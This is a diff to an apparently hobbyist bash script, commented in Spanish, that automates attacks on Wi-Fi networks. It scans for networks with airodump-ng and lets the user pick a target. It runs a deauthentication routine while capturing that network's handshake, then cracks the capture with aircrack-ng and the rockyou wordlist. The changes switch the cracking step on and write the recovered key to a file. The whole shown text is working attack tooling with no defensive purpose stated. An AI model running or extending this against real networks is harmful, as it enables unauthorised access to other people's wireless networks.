@@ -108,7 +108,7 @@ open_terminal() {
     x-terminal-emulator -title "$TERMINAL_TITLE" -e "$COMMAND_RUN" &
 
     # Esperar que la terminal se inicie
-    sleep 1
+    sleep 2
 
 
     # Obtener ID de la ventana asociada al proceso
@@ -211,7 +211,7 @@ select_wireless(){
         fi 
     else
         # No hay entorno gráfico, ejecutarlo en la terminal actual
-        timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one --band abg # VERIFICAR PORQUE AHORA NO HACE OUTPUT
+        sudo timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one --band abg # VERIFICAR PORQUE AHORA NO HACE OUTPUT
     fi
     
     
@@ -259,14 +259,15 @@ select_wireless(){
     if [[ $USER_ID =~ ^[0-9]+$ ]] && [[ $USER_ID -ge 1 ]] && [[ $USER_ID -lt ${#NETWORKS[@]} ]]; then
         echo "Selected complete information:"
         IFS=',' read -r BSSID Channel Privacy Cipher Auth Beacons ESSID <<< "${NETWORKS[$USER_ID]}"
-
-        BSSID_VAR="$BSSID"
-        CHANNEL_VAR="$Channel"
-        PRIVACY_VAR="$Privacy"
-        CIPHER_VAR="$Cipher"
-        AUTH_VAR="$Auth"
-        BEACONS_VAR="$Beacons"
-        ESSID_VAR="$ESSID"
+        
+        #Con awk quito espacios que quedan.
+        BSSID_VAR=$(echo "$BSSID" | awk '{$1=$1};1')
+        CHANNEL_VAR=$(echo "$Channel" | awk '{$1=$1};1')
+        PRIVACY_VAR=$(echo "$Privacy" | awk '{$1=$1};1')
+        CIPHER_VAR=$(echo "$Cipher" | awk '{$1=$1};1')
+        AUTH_VAR=$(echo "$Auth" | awk '{$1=$1};1')
+        BEACONS_VAR=$(echo "$Beacons" | awk '{$1=$1};1')
+        ESSID_VAR=$(echo "$ESSID" | awk '{$1=$1};1')
 
         echo "$BSSID_VAR $ESSID_VAR"
 
@@ -320,7 +321,7 @@ Deauther(){
 }
 
 Craking_handshake(){
-
+    clear
     cd data_collected/network_dump
 
     FILE="wificapture-01.cap"
@@ -332,16 +333,24 @@ Craking_handshake(){
         
     WORDLIST="/usr/share/wordlists/rockyou.txt"
 
-    #OUTPUT=`aircrack-ng $FILE -w $WORDLIST`
+    CRACKED_PASSWORD=false
 
-    if aircrack-ng $FILE -w $WORDLIST ;then
-        echo "FOUND KEYS"
-        rm ./*
+    if aircrack-ng $FILE -w $WORDLIST > result_"$ESSID_VAR".txt ;then
+
+        
+        echo "We cracked the password. Saved on ./data_collected/network_dump/result_ESSID.txt"
+        RESULTS=$(grep "KEY FOUND!" result_"$ESSID_VAR".txt | tr -d '[:space:]')
+        echo "$RESULTS"
+        CRACKED_PASSWORD=true
+
+        rm ./wificapture-01.*
+        cd .. && cd ..
+        sleep 5
         return 0
     else 
         echo "NO FOUND"
-        rm ./*
-        return 1
+        rm ./wificapture-01.*
+        exit 1
     fi
 
 }
@@ -392,6 +401,7 @@ Bruteforce(){
                 # No hay entorno gráfico, ejecutarlo en la terminal actual
                 Deauther "$TIMEOUT_USR" &
                 nohup timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
+                echo "atack in progress"
 
             fi
         
@@ -403,7 +413,9 @@ Bruteforce(){
 
     sleep $TIMEOUT_USR
 
-    #Craking_handshake
+
+    Craking_handshake
+
     
 }
 
